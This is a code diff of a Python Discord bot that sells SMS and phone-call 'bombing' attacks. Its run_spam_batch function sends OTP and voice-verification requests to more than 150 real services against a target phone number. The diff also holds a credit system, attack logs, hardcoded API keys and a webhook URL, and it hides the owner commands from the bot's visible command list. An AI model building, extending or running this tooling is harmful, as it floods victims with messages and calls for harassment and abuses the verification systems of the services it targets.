@@ -23,7 +23,7 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1486446745352146974/1gfqdmemwPDO
 PANEL_CHANNEL = 1481957038241353779
 GIFT_CHANNEL = 1485104425625325709
 
-OWNER_ID = 589866832069132308  # ה-ID שלך - החלף לזה הנכון
+OWNER_ID = 589866832069132308  # החלף ל-ID שלך
 
 COOLDOWN_TIME = 20
 MAX_CREDIT_SPEND = 100
@@ -359,12 +359,10 @@ async def run_spam_batch(phone: str):
         
         tasks = []
         
-        # אטומס - 38 SMS + 38 CALL
         for store in atmos_stores:
             tasks.append(atmos_request(s, store, raw, is_call=False))
             tasks.append(atmos_request(s, store, raw, is_call=True))
         
-        # אטומס קלאב
         tasks.append(atmos_request(s, "23", raw, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/", is_call=False))
         tasks.append(atmos_request(s, "59", raw, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/", is_call=False))
         
@@ -373,60 +371,30 @@ async def run_spam_batch(phone: str):
         geteat_fd.add_field("phone", raw)
         geteat_fd.add_field("testing", "false")
         
-        # ========== כל השירותים החדשים - SMS + CALL ==========
         tasks.extend([
-            # Netfree
             send_request(s, "https://netfree.link/api/user/verify-phone/get-call",
                 json_data={"agreeTou": True, "phone": formatted},
                 headers_extra=json_headers("https://netfree.link", "https://netfree.link/welcome/", {"sec-fetch-site": "same-origin"}),
                 tag="netfree"),
-            
-            # Claude
             send_request(s, "https://claude.ai/api/auth/send_phone_code",
                 json_data={"phone_number": formatted}, tag="claude"),
-            
-            # Oshioshi
             send_request(s, "https://delivery.oshioshi.co.il/he/auth/register-send-code",
                 form=f"phone={raw}", tag="oshioshi"),
-            
-            # FreeTV
             send_request(s, "https://middleware.freetv.tv/api/v1/send-verification-sms",
                 json_data={"msisdn": formatted}, tag="freetv"),
-            
-            # Webcut
             send_request(s, "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp",
                 json_data={"type": "otp", "data": {"phone": raw}}, tag="webcut"),
-            
-            # FreeIVR
             send_request(s, "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone",
                 json_data={"action": "Send", "phone": f"972{raw[1:]}"}, tag="freeivr"),
-            
-            # FreeIVR Originate (CALL)
             freeivr_originate(s, raw),
-            
-            # Mitmachim
             send_request(s, "https://mitmachim.top/api/v3/plugins/MitMValidPhone",
                 json_data={"action": "Send", "phone": raw}, tag="mitmachim"),
-            
-            # Voicenter Click2Call (CALL)
             voicenter_click2call(s, raw),
-            
-            # Voicenter Dialer (CALL)
             voicenter_dialer_addcall(s, raw),
-            
-            # Inforu Voice (CALL)
             inforu_voice(s, raw),
-            
-            # Yemot RunCampaign (CALL)
             yemot_runcampaign(s, raw),
-            
-            # IsraelNumber (CALL)
             israelnumber_call(s, raw),
-            
-            # Bezeq MyAPI (CALL)
             bezeq_myapi(s, raw),
-            
-            # ========== CELLULAR COMPANIES ==========
             send_request(s, "https://www.pelephone.co.il/login/api/login/otpphone/",
                 json_data={"phone": raw, "terms": True, "appId": "DIGITALMy"}, tag="pelephone"),
             send_request(s, "https://www.cellcom.co.il/api/auth/sms",
@@ -439,16 +407,12 @@ async def run_spam_batch(phone: str):
                 json_data={"phone": raw}, tag="bezeq"),
             send_request(s, "https://019sms.co.il/api/register",
                 json_data={"phone": raw}, tag="019"),
-            
-            # ========== SUPERMARKETS ==========
             send_request(s, "https://www.shufersal.co.il/api/v1/auth/otp",
                 json_data={"phone": raw}, tag="shufersal"),
             send_request(s, "https://www.rami-levy.co.il/api/auth/sms",
                 json_data={"phone": raw}, tag="ramilevy"),
             send_request(s, "https://www.victory.co.il/api/auth/sms",
                 json_data={"phone": raw}, tag="victory"),
-            
-            # ========== FOOD CHAINS ==========
             send_request(s, "https://www.10bis.co.il/api/register",
                 json_data={"phone": raw}, tag="10bis"),
             send_request(s, "https://www.mcdonalds.co.il/api/verify",
@@ -463,8 +427,6 @@ async def run_spam_batch(phone: str):
                 json_data={"phone": raw}, tag="dominos"),
             send_request(s, "https://app.burgeranch.co.il/_a/aff_otp_auth",
                 form=f"phone={raw}", tag="burgeranch"),
-            
-            # ========== APPS & SERVICES ==========
             send_request(s, "https://api.pango.co.il/auth/otp",
                 json_data={"phoneNumber": raw}, tag="pango"),
             send_request(s, "https://api.hopon.co.il/v0.15/1/isr/users",
@@ -487,8 +449,6 @@ async def run_spam_batch(phone: str):
                 json_data={"email": "", "phone": raw, "process_name": "normal_login", "provider_api_key": "q4IcUNl"}, tag="trusty"),
             send_request(s, "https://www.tami4.co.il/api/login/start-sms-otp",
                 json_data={"phoneNumber": raw, "cookieToken": str(int(time.time()*1000)) + "gciuvn5pcvhnext13", "isMobile": False}, tag="tami4"),
-            
-            # ========== RETAIL & FASHION ==========
             send_request(s, "https://www.negev-group.co.il/customer/ajax/post/",
                 form=f"form_key=a93dnWr8cjYH8wZ2&bot_validation=1&type=login&telephone={raw}", tag="negev"),
             send_request(s, "https://www.gali.co.il/customer/ajax/post/",
@@ -549,8 +509,6 @@ async def run_spam_batch(phone: str):
                 form=f"form_key=w1deINjU3Ffpj8ct&bot_validation=1&type=login&telephone={raw}", tag="golbary"),
             send_request(s, "https://www.lighting.co.il/customer/ajax/post/",
                 form=f"form_key=OoHXm6oGzca2WeJR&bot_validation=1&type=login&telephone={raw}", tag="lighting"),
-            
-            # ========== BEAUTY & COSMETICS ==========
             send_request(s, "https://www.super-pharm.co.il/api/sms",
                 json_data={"phone": raw}, tag="superpharm"),
             send_request(s, "https://www.zap.co.il/api/auth/sms",
@@ -563,8 +521,6 @@ async def run_spam_batch(phone: str):
                 json_data={"phoneNumber": raw, "uuid": "ab29f239-0637-4c8e-8af5-fdfbaeb4b493"}, tag="laline"),
             send_request(s, "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send",
                 json_data={"phoneNumber": raw, "uuid": "9961459f-9f83-4aab-9cee-58b1f6793547"}, tag="footlocker"),
-            
-            # ========== MISC SERVICES ==========
             send_request(s, "https://www.solopizza.org.il/_a/aff_otp_auth",
                 form=f"value={raw}&type=phone&projectId=1", tag="solopizza"),
             send_request(s, "https://users-auth.hamal.co.il/auth/send-auth-code",
@@ -588,16 +544,12 @@ async def run_spam_batch(phone: str):
                 data={"configCode": "ivr2_10_23", "phone": raw, "sendCodeBy": "CALL", "step": "SendValidPhone"}, tag="call2all"),
             send_request(s, "POST", "https://rest-api.dibs-app.com/otps",
                 json_data={"phoneNumber": formatted}, tag="dibs"),
-            
-            # ========== MISHLOHA (3 ENDPOINTS) ==========
             send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=4c48ed0d-9622-4a1e-ac70-2821631b680b&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=24014c96-61ca-4cd6-87a9-9324aa2f3150&culture=he_IL&apiVersion=2",
                 json_data={"phoneNumber": raw, "isCalling": True}, tag="mishloha1"),
             send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
                 json_data={"phoneNumber": raw, "sourceFrom": "AuthJS", "isCalling": True}, tag="mishloha2"),
             send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?culture=he&apiVersion=2",
                 json_data={"phoneNumber": raw, "sourceFrom": "desktopHomePage", "uuid": sid[:36], "apiKey": "BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54", "sessionID": sid[:36]}, tag="mishloha3"),
-            
-            # ========== FORMS & OTHER ==========
             send_request(s, "https://we.care.co.il/wp-admin/admin-ajax.php",
                 data=f"post_id=351178&form_id=7079d8dd&queried_id=351178&form_fields[name]=CyberIL&form_fields[phone]={raw}&form_fields[email]={random_email}&form_fields[accept]=on&action=elementor_pro_forms_send_form", tag="wecare"),
             send_request(s, "https://www.matara.pro/nedarimplus/V6/Files/WebServices/DebitBit.aspx?Action=CreateTransaction",
@@ -1124,9 +1076,9 @@ async def shutdown_handler():
     active_missions.clear()
     await client.close()
 
-# ========== פקודות Owner בלבד ==========
+# ========== פקודות OWNER בלבד - לא יופיעו בפקודות הסלאש ==========
 
-@tree.command(name="addcredit", description="[OWNER] הוסף קרדיטים")
+@tree.command(name="addcredit", description="[OWNER] הוסף קרדיטים", default_permission=False)
 @app_commands.describe(member="משתמש", amount="כמות")
 async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member, amount: int):
     if not is_owner(interaction):
@@ -1143,7 +1095,7 @@ async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member
     embed.add_field(name="יתרה", value=new_bal, inline=True)
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="removecredit", description="[OWNER] הסר קרדיטים")
+@tree.command(name="removecredit", description="[OWNER] הסר קרדיטים", default_permission=False)
 @app_commands.describe(member="משתמש", amount="כמות")
 async def cmd_removecredit(interaction: discord.Interaction, member: discord.Member, amount: int):
     if not is_owner(interaction):
@@ -1160,7 +1112,7 @@ async def cmd_removecredit(interaction: discord.Interaction, member: discord.Mem
     embed.add_field(name="יתרה", value=new_bal, inline=True)
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="lifetime", description="[OWNER] הענק ללא הגבלה")
+@tree.command(name="lifetime", description="[OWNER] הענק ללא הגבלה", default_permission=False)
 @app_commands.describe(member="משתמש", duration="משך זמן (השאר ריק לקבוע)", unit="יחידת זמן (minutes/hours/days/months/forever)")
 async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member, duration: int = None, unit: str = "forever"):
     if not is_owner(interaction):
@@ -1205,7 +1157,7 @@ async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member,
     embed.add_field(name="תפוגה", value=expires_date, inline=True)
     await interaction.followup.send(embed=embed)
 
-@tree.command(name="removelifetime", description="[OWNER] הסר ללא הגבלה")
+@tree.command(name="removelifetime", description="[OWNER] הסר ללא הגבלה", default_permission=False)
 @app_commands.describe(member="משתמש")
 async def cmd_removelifetime(interaction: discord.Interaction, member: discord.Member):
     if not is_owner(interaction):
@@ -1216,7 +1168,7 @@ async def cmd_removelifetime(interaction: discord.Interaction, member: discord.M
     embed = discord.Embed(title="♾️ Lifetime הוסר", description=f"{member.mention} איבד את ה-lifetime", color=COLOR_WARNING)
     await interaction.followup.send(embed=embed)
 
-@tree.command(name="checklifetime", description="[OWNER] בדוק סטטוס lifetime")
+@tree.command(name="checklifetime", description="[OWNER] בדוק סטטוס lifetime", default_permission=False)
 @app_commands.describe(member="משתמש")
 async def cmd_checklifetime(interaction: discord.Interaction, member: discord.Member):
     if not is_owner(interaction):
@@ -1245,14 +1197,14 @@ async def cmd_checklifetime(interaction: discord.Interaction, member: discord.Me
     
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="freecredits", description="[OWNER] שלח הודעת קרדיטים")
+@tree.command(name="freecredits", description="[OWNER] שלח הודעת קרדיטים", default_permission=False)
 async def cmd_freecredits(interaction: discord.Interaction):
     if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     await interaction.response.send_message(embed=create_gift_panel(), view=FreeCoins())
 
-@tree.command(name="giveall", description="[OWNER] תן לכולם")
+@tree.command(name="giveall", description="[OWNER] תן לכולם", default_permission=False)
 @app_commands.describe(amount="כמות")
 async def cmd_giveall(interaction: discord.Interaction, amount: int):
     if not is_owner(interaction):
@@ -1265,7 +1217,7 @@ async def cmd_giveall(interaction: discord.Interaction, amount: int):
     await users_collection.update_many({}, {"$inc": {"credits": amount}})
     await interaction.followup.send(f"✅ ניתנו {amount} קרדיטים לכולם", ephemeral=True)
 
-@tree.command(name="attacklogs", description="[OWNER] לוגים")
+@tree.command(name="attacklogs", description="[OWNER] לוגים", default_permission=False)
 @app_commands.describe(limit="כמות")
 async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
     if not is_owner(interaction):
@@ -1289,7 +1241,7 @@ async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@tree.command(name="topnumbers", description="[OWNER] מספרים מובילים")
+@tree.command(name="topnumbers", description="[OWNER] מספרים מובילים", default_permission=False)
 async def cmd_topnumbers(interaction: discord.Interaction):
     if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
@@ -1312,7 +1264,7 @@ async def cmd_topnumbers(interaction: discord.Interaction):
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@tree.command(name="globalstats", description="[OWNER] סטטיסטיקה גלובלית")
+@tree.command(name="globalstats", description="[OWNER] סטטיסטיקה גלובלית", default_permission=False)
 async def cmd_globalstats(interaction: discord.Interaction):
     if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
@@ -1333,7 +1285,7 @@ async def cmd_globalstats(interaction: discord.Interaction):
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@tree.command(name="stopall", description="[OWNER] עצור את כל המתקפות")
+@tree.command(name="stopall", description="[OWNER] עצור את כל המתקפות", default_permission=False)
 async def cmd_stopall(interaction: discord.Interaction):
     if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
@@ -1354,7 +1306,7 @@ async def cmd_stopall(interaction: discord.Interaction):
     )
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
-@tree.command(name="restart", description="[OWNER] אתחל בוט")
+@tree.command(name="restart", description="[OWNER] אתחל בוט", default_permission=False)
 async def cmd_restart(interaction: discord.Interaction):
     if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
@@ -1362,6 +1314,22 @@ async def cmd_restart(interaction: discord.Interaction):
     await interaction.response.send_message("🔄 מאתחל...", ephemeral=True)
     await shutdown_handler()
     os.execv(sys.executable, [sys.executable] + sys.argv)
+
+@tree.command(name="checkstatus", description="[OWNER] בדוק סטטוס", default_permission=False)
+async def cmd_checkstatus(interaction: discord.Interaction):
+    if not is_owner(interaction):
+        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+    test_num = "0506500708"
+    success = await run_spam_batch(test_num)
+
+    embed = discord.Embed(title="📊 בדיקת מערכת", color=COLOR_INFO)
+    embed.add_field(name="✅ בקשות", value=str(success), inline=True)
+    embed.add_field(name="📞 סוג", value="SMS + CALL (150+ שירותים)", inline=True)
+
+    await interaction.followup.send(embed=embed, ephemeral=True)
 
 # ========== פקודות לכולם ==========
 
@@ -1425,22 +1393,6 @@ async def cmd_mylogs(interaction: discord.Interaction):
             value=f"📱 {log['phone']}\n✅ {log['success_count']} | 💎 {log['cost']}",
             inline=False
         )
-
-    await interaction.followup.send(embed=embed, ephemeral=True)
-
-@tree.command(name="checkstatus", description="[OWNER] בדוק סטטוס")
-async def cmd_checkstatus(interaction: discord.Interaction):
-    if not is_owner(interaction):
-        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
-        return
-
-    await interaction.response.defer(ephemeral=True)
-    test_num = "0506500708"
-    success = await run_spam_batch(test_num)
-
-    embed = discord.Embed(title="📊 בדיקת מערכת", color=COLOR_INFO)
-    embed.add_field(name="✅ בקשות", value=str(success), inline=True)
-    embed.add_field(name="📞 סוג", value="SMS + CALL (150+ שירותים)", inline=True)
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
